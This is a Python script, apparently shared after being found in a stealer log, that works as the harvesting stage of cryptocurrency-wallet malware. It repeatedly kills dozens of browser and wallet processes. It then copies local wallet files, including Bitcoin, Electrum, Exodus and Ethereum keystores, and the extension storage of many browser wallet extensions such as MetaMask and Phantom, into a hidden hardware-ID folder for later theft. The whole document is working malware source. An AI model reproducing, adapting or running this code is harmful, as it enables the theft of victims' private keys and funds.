# Not mine, found on a stealer log: https://www.virustotal.com/gui/file/844b170cc7524a18c93fe70099b18e320ed2f503d08eb4fe8aa6b884f3dfb630

_AC='Web Client'
_AB='Javelin Browser'
_AA='SafeGuard Browser'
_A9='DuckDuckGo Browser'
_A8='Tinfoil for Facebook'
_A7='Tutanota Web Client'
_A6='Coc Coc Browser'
_A5='Iron Browser'
_A4='MedeAnalytics'
_A3='Lunascape'
_A2='SRWare Iron'
_A1='Local Storage'
_A0='hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_z='jnlgamecbpmbajjfhmmmlhejkemejdma'
_y='efbglgofoippbgcjepnhiblaibcnclgk'
_x='ejbalbakoplchlghecdalmeeeajnimhm'
_w='TrustWallet'
_v='uniswap.exe'
_u='trustwallet.exe'
_t='coinomi.exe'
_s='armory.exe'
_r='avant.exe'
_q='k-meleon.exe'
_p='gnome-web.exe'
_o='lunascape.exe'
_n='falkon.exe'
_m='qutebrowser.exe'
_l='brave.exe'
_k='CocCoc'
_j='Whale'
_i='Naver'
_h='CentBrowser'
_g='Dragon'
_f='Orbit'
_e='Naver Whale'
_d='Cent Browser'
_c='Comodo Dragon'
_b='Coinomi'
_a='1inch'
_Z='Uniswap'
_Y='SushiSwap'
_X='Curve'
_W='Zerion'
_V='Argent'
_U='Dapper'
_T='Exodus'
_S='Comodo'
_R='Tinfoil'
_Q='SafeGuard'
_P='DuckDuckGo'
_O='Tutanota'
_N='Iron'
_M='Browser'
_L='Basilisk'
_K='Vivaldi Snapshot'
_J='XBrowser'
_I='Polarity'
_H='Blisk'
_G='Javelin'
_F='Falkon'
_E='QuteBrowser'
_D='wallets'
_C='APPDATA'
_B='User Data'
_A='LOCALAPPDATA'
import os,shutil,uuid,psutil,time
browser_processes=['chrome.exe','msedge.exe','opera.exe',_l,'vivaldi.exe','yandex.exe','slimjet.exe','epic.exe','dragon.exe','centbrowser.exe',_m,_n,'whale.exe','iron.exe','torch.exe','coccoc.exe','polarity.exe','javelin.exe','orbit.exe','chedot.exe',_o,'otter.exe','palemoon.exe','tutanota.exe','duckduckgo.exe','safeguard.exe','xbrowser.exe','medeanalytics.exe','tinfoil.exe','webcat.exe','basilisk.exe','tor.exe','flynx.exe','librewolf.exe','seamonkey.exe','midori.exe',_p,'surf.exe',_m,'qute-browser.exe','otter-browser.exe','pale-moon.exe','arora.exe','qupzilla.exe','kometa.exe',_q,_r,_o,'puffin.exe','sleipnir.exe','epiphany.exe','firefox.exe',_n,'librefox.exe',_p,'webpositive.exe','nexx.exe',_q,_r,'ibrowsr.exe','superbird.exe','rockmelt.exe','hotdog.exe','freedom.exe','flashpeak.exe','slimbrowser.exe','nanoweb.exe','datafox.exe','cyberfox.exe','eset.exe','reborn.exe','charm.exe','fossa.exe','penguin.exe','novel.exe','celtic.exe','polyweb.exe']
wallet_processes=['bitcoin-qt.exe','zcashd.exe',_s,'bytecoin.exe','jaxx.exe','exodus.exe','geth.exe','electrum.exe','atomic.exe','guarda.exe',_t,_u,'dapper.exe','zerion.exe','argent.exe','curve.exe','sushiswap.exe',_v,'1inch.exe','blockchain.exe','mycelium.exe','paxful.exe','celo.exe','nexo.exe',_l,'metamask.exe','bancor.exe','pillar.exe',_u,'kinesis.exe','ripple.exe','ledger-live.exe','trezor.exe',_s,'libra.exe',_v,'coinbase.exe','crypto.exe','zengo.exe','bitpay.exe','bitbns.exe',_t,'blockchain.info.exe','smartbit.exe','bitcoin-cash.exe','stellar.exe','dash.exe','monero.exe','vechain.exe','terra.exe','algorand.exe','tezos.exe','hedera.exe','filecoin.exe','safepal.exe','horizon.exe','bittrex.exe','bitstamp.exe','gate.io.exe','kucoin.exe','okex.exe','pancakeswap.exe']
def kill_processes(process_names,attempts=50,delay=0):
	C='pid';B='name'
	for D in range(attempts):
		print(f"Attempt {D+1} to kill processes...")
		for A in psutil.process_iter([C,B]):
			try:
				if A.info[B].lower()in[A.lower()for A in process_names]:print(f"Killing process: {A.info[B]} (PID: {A.info[C]})");A.terminate()
			except(psutil.NoSuchProcess,psutil.AccessDenied,psutil.ZombieProcess):pass
		time.sleep(delay)
print('Killing browser processes...')
kill_processes(browser_processes)
print('Killing wallet processes...')
kill_processes(wallet_processes)
print('Done.')
time.sleep(1)
wallets_ext_names={'MetaMask':'nkbihfbeogaeaoehlefnkodbefgpgknn','MetaMask-edge':_x,'Binance':'fhbohimaelbohpjbbldcngcnapndodjp','Phantom':'bfnaelmomeimhlpmgjnjophhpkkoljpa','Coinbase':'hnfanknocfeofbddgcijnmhnfnkdnaad','Ronin':'fnjhmkhhmkbjkkabndcnnogagogbneec',_T:'aholpfdialjgjfhomihkjbmgjidlcdno','Coin98':'aeachknmefphepccionboohckonoeemg','KardiaChain':'pdadjkfkgcafgbceimcpbkalnfnepbnk','TerraStation':'aiifbnbfobpmeekipheeijimdpnlpgpp','Wombat':'amkmjjmmflddogmhpjloimipbofnfjih','Harmony':'fnnegphlobjdpkhecapkijjdkgcjhkib','Nami':'lpfcbjknijpeeillifnkikgncikgfhdo','MartianAptos':_y,'Braavos':_z,'XDEFI':_A0,'Yoroi':'ffnbelfdoeiohenkjibnmadjiehjhajb','TON':'nphplpgoakhhjchkkhmiggakijnkhfnd','Authenticator':'bhghoamapcdpbohphigoooaddinpkbai','MetaMask_Edge':_x,'Tron':'ibnejdfjmmkpcnlpebklmnkoeoihofec','Trezor':'lnaonmdpfhbgmhbmhlbbnhegggijcfcg','Ledger':'knjilbhbkmjdjgaebdcejjlmnpagjmei','Mycelium':'mbndjliiknpfmpanccheokhdbbmdaaei',_w:'eimcpmfpjgojopihlhfjkaklpfkmhglp','TrustWallet1':'egjidjbpglichdcondbcbdnbeeppgdph','Ellipal':'klkbpbgfplbofepkbkaodljfifmohokb',_U:'cimfefinodkjoijcbgffjnmklmnngjge','BitKeep':'nfdgfjplkllcbmnlpnfkpidijlnfjfjj',_V:'jbecljpfobbfnhmpgbdgmjajmbgdckgj','Blockchain Wallet':'bmnjpfboeieiejchjibfbaiidbdgknjl','cryptocom-wallet-extensio':'hifafgmccdpekplomjjkcfgodnhcellj',_W:'hekjcgjfhbldlcfbjdfpmhkjjpmppjcf','Aave':'neihkdpkimcjokhblhpfnjmfklkpjkpj',_X:'dofnkedmjpfpjncpgijbffklkmdolnkk',_Y:'hlbocmgldbcopjfhfmicmdhngbkjdgmj',_Z:'jgfjjpnnphjkjiecligjdnfmbmhbajpm',_a:'bfbijoiifjbkbbajgjgdkmceibjlcbj','okx-wallet':'mcohilncbfahbmgdjkbpemcciiolgcge','unisat-wallet':'ppbibelpcjmhbdihakflkdcoccbgbkpo','petra-aptos-wallet':'ejjladinnckdgjemekebdpeokbikhfci','xdefi-wallet':_A0,'manta-wallet':'enabgbdfcbaehmbigakijjabdpdnimlg','rose-wallet':'ppdadbejkmjnefldpcdjhnkpbjkikoip','wallet-guard-protect-your':'pdgbckgdncnhihllonhnjbdoighgpimk','subwallet-polkadot-wallet':'onhogfjeacnfoofkfgppdlbmlmnplgbn','argent-x-starknet-wallet':'dlcobpjiigpikoobohmabehhmhfoodbb','bitget-wallet-formerly-bi':'jiidiaalihmmhddjgbnbgdfflelocpak','core-crypto-wallet-nft-ex':'agoakfejjabomempkjlepdflaleeobhb','braavos-starknet-wallet':_z,'keplr':'dmkamcknogkgcdfhhbddcghachkejeap','martian-aptos-sui-wallet':_y,'xverse-wallet':'idnnbdplmphpflfnlkomgpfbpcgelopg','gate-wallet':'cpmkedoipcpimgecpmgpldfpohjplkpp','sender-wallet':'epapihdplajcdnnkdeiahlgigofloibg','desig-wallet':'panpgppehdchfphcigocleabcmcgfoca','fewcha-move-wallet':'ebfidpplhabeedpnhjnobghokpiioolj','keplr-edge':'ocodgmmffbkkeecmadcijjhkmeohinei'}
wallet_local_paths={'Bitcoin':os.path.join(os.getenv(_C),'Bitcoin',_D),'Zcash':os.path.join(os.getenv(_C),'Zcash'),'Armory':os.path.join(os.getenv(_C),'Armory'),'Bytecoin':os.path.join(os.getenv(_C),'bytecoin'),'Jaxx':os.path.join(os.getenv(_C),'com.liberty.jaxx','IndexedDB','file__0.indexeddb.leveldb'),_T:os.path.join(os.getenv(_C),_T,'exodus.wallet'),'Ethereum':os.path.join(os.getenv(_C),'Ethereum','keystore'),'Electrum':os.path.join(os.getenv(_C),'Electrum',_D),'AtomicWallet':os.path.join(os.getenv(_C),'atomic',_A1,'leveldb'),'Guarda':os.path.join(os.getenv(_C),'Guarda',_A1,'leveldb'),_b:os.path.join(os.getenv(_C),_b,_b,_D),_w:os.path.join(os.getenv(_C),'Trust Wallet',_D),_U:os.path.join(os.getenv(_C),_U,_D),_W:os.path.join(os.getenv(_C),_W,_D),_V:os.path.join(os.getenv(_C),_V,_D),_X:os.path.join(os.getenv(_C),_X,_D),_Y:os.path.join(os.getenv(_C),_Y,_D),_Z:os.path.join(os.getenv(_C),_Z,_D),_a:os.path.join(os.getenv(_C),_a,_D)}
browser_user_data_paths={'Google Chrome':os.path.join(os.getenv(_A),'Google','Chrome',_B),'Microsoft Edge':os.path.join(os.getenv(_A),'Microsoft','Edge',_B),'Opera':os.path.join(os.getenv(_A),'Opera Software','Opera Stable'),'Brave':os.path.join(os.getenv(_A),'BraveSoftware','Brave-Browser',_B),'Vivaldi':os.path.join(os.getenv(_A),'Vivaldi',_B),'Yandex':os.path.join(os.getenv(_A),'Yandex','YandexBrowser',_B),'Slimjet':os.path.join(os.getenv(_A),'Slimjet',_B),'Epic':os.path.join(os.getenv(_A),'Epic Privacy Browser',_B),_c:os.path.join(os.getenv(_A),_S,_g,_B),_d:os.path.join(os.getenv(_A),_h,_B),_E:os.path.join(os.getenv(_A),_E,_B),_F:os.path.join(os.getenv(_A),_F,_B),_e:os.path.join(os.getenv(_A),_i,_j,_B),_A2:os.path.join(os.getenv(_A),_A2,_B),_H:os.path.join(os.getenv(_A),_H,_B),_N:os.path.join(os.getenv(_A),_N,_B),'Torch':os.path.join(os.getenv(_A),'Torch',_B),'Coc Coc':os.path.join(os.getenv(_A),_k,_M,_B),_I:os.path.join(os.getenv(_A),_I,_B),_G:os.path.join(os.getenv(_A),_G,_B),_f:os.path.join(os.getenv(_A),_f,_B),'Chedot':os.path.join(os.getenv(_A),'Chedot',_B),_A3:os.path.join(os.getenv(_A),_A3,_B),'Otter Browser':os.path.join(os.getenv(_A),'Otter',_B),'Pale Moon':os.path.join(os.getenv(_A),'PaleMoon',_B),_O:os.path.join(os.getenv(_A),_O,_B),_P:os.path.join(os.getenv(_A),_P,_B),_Q:os.path.join(os.getenv(_A),_Q,_B),_J:os.path.join(os.getenv(_A),_J,_B),_A4:os.path.join(os.getenv(_A),_A4,_B),_R:os.path.join(os.getenv(_A),_R,_B),_F:os.path.join(os.getenv(_A),_F,_B),_E:os.path.join(os.getenv(_A),_E,_B),_K:os.path.join(os.getenv(_A),_K,_B),'Comodo IceDragon':os.path.join(os.getenv(_A),_S,'IceDragon',_B),'WebCat':os.path.join(os.getenv(_A),'WebCat',_B),'Orbit Browser':os.path.join(os.getenv(_A),_f,_B),_L:os.path.join(os.getenv(_A),_L,_B),_E:os.path.join(os.getenv(_A),_E,_B),_F:os.path.join(os.getenv(_A),_F,_B),_K:os.path.join(os.getenv(_A),_K,_B),_A5:os.path.join(os.getenv(_A),_N,_B),_A6:os.path.join(os.getenv(_A),_k,_M,_B),_d:os.path.join(os.getenv(_A),_h,_B),_c:os.path.join(os.getenv(_A),_S,_g,_B),_e:os.path.join(os.getenv(_A),_i,_j,_B),_H:os.path.join(os.getenv(_A),_H,_B),_I:os.path.join(os.getenv(_A),_I,_B),_G:os.path.join(os.getenv(_A),_G,_B),_A7:os.path.join(os.getenv(_A),_O,_AC,_B),_A8:os.path.join(os.getenv(_A),_R,'Facebook',_B),_A9:os.path.join(os.getenv(_A),_P,_B),_AA:os.path.join(os.getenv(_A),_Q,_M,_B),_J:os.path.join(os.getenv(_A),_J,_B),_AB:os.path.join(os.getenv(_A),_G,_B),_L:os.path.join(os.getenv(_A),_L,_B),_F:os.path.join(os.getenv(_A),_F,_B),_E:os.path.join(os.getenv(_A),_E,_B),_K:os.path.join(os.getenv(_A),_K,_B),_A5:os.path.join(os.getenv(_A),_N,_B),_A6:os.path.join(os.getenv(_A),_k,_M,_B),_d:os.path.join(os.getenv(_A),_h,_B),_c:os.path.join(os.getenv(_A),_S,_g,_B),_e:os.path.join(os.getenv(_A),_i,_j,_B),_H:os.path.join(os.getenv(_A),_H,_B),_I:os.path.join(os.getenv(_A),_I,_B),_G:os.path.join(os.getenv(_A),_G,_B),_A7:os.path.join(os.getenv(_A),_O,_AC,_B),_A8:os.path.join(os.getenv(_A),_R,'Facebook',_B),_A9:os.path.join(os.getenv(_A),_P,_B),_AA:os.path.join(os.getenv(_A),_Q,_M,_B),_J:os.path.join(os.getenv(_A),_J,_B),_AB:os.path.join(os.getenv(_A),_G,_B),_L:os.path.join(os.getenv(_A),_L,_B)}
def get_hwid():
	try:return str(uuid.getnode())
	except Exception as A:print(f"Error getting HWID: {A}");return
def find_folder_by_hwid(base_path,hwid):
	A=base_path
	try:
		for B in os.listdir(A):
			C=os.path.join(A,B)
			if os.path.isdir(C)and B==hwid:return C
		return
	except Exception as D:print(f"Error finding folder by HWID: {D}");return
def copy_wallet_data(wallet_name,source_path,dest_folder):
	A=source_path
	try:
		if os.path.exists(A):
			B=os.path.join(dest_folder,wallet_name)
			if not os.path.exists(B):os.makedirs(B)
			if os.path.isfile(A):shutil.copy(A,B)
			elif os.path.isdir(A):shutil.copytree(A,B,dirs_exist_ok=True)
	except(PermissionError,OSError)as C:print(f"Error copying {A}: {C}")
	except Exception as C:print(f"Unexpected error copying {A}: {C}")
def copy_extension_data(browser_name,user_data_path,dest_folder):
	G=user_data_path
	try:
		for D in os.listdir(G):
			H=os.path.join(G,D)
			if os.path.isdir(H)and D!='System Profile':
				E=os.path.join(H,'Local Extension Settings')
				if os.path.exists(E):
					for C in os.listdir(E):
						if C in wallets_ext_names.values():
							I=[A for(A,B)in wallets_ext_names.items()if B==C][0];F=os.path.join(E,C);A=os.path.join(dest_folder,D,f"{I}_{C}")
							try:
								os.makedirs(os.path.dirname(A),exist_ok=True)
								if not os.path.exists(A):shutil.copytree(F,A,dirs_exist_ok=True)
							except(PermissionError,OSError)as B:print(f"Error copying {F} to {A}: {B}")
							except Exception as B:print(f"Unexpected error copying {F} to {A}: {B}")
	except Exception as B:print(f"Error copying extension data: {B}")
hwid=get_hwid()
if not hwid:print('Unable to proceed without HWID.');exit(1)
searches_directory=os.path.join(os.getenv('USERPROFILE'),'Documents')
hwid_folder=find_folder_by_hwid(searches_directory,hwid)
if not hwid_folder:
	hwid_folder=os.path.join(searches_directory,hwid)
	try:
		if not os.path.exists(hwid_folder):os.makedirs(hwid_folder)
	except Exception as e:print(f"Error creating HWID folder: {e}");exit(1)
wallets_folder=os.path.join(hwid_folder,_D)
if not os.path.exists(wallets_folder):
	try:os.makedirs(wallets_folder)
	except Exception as e:print(f"Error creating wallets folder: {e}");exit(1)
for(wallet_name,source_path)in wallet_local_paths.items():copy_wallet_data(wallet_name,source_path,wallets_folder)
for(browser_name,user_data_path)in browser_user_data_paths.items():
	if os.path.exists(user_data_path)and os.path.isdir(user_data_path):
		ex_folder=os.path.join(wallets_folder,f"{browser_name}Ex")
		if not os.path.exists(ex_folder):
			try:os.makedirs(ex_folder)
			except Exception as e:print(f"Error creating extension folder for {browser_name}: {e}");continue
		copy_extension_data(browser_name,user_data_path,ex_folder)
	else:print(f"User data path for {browser_name} not found or invalid: {user_data_path}")
print('Wallet data extraction completed.')
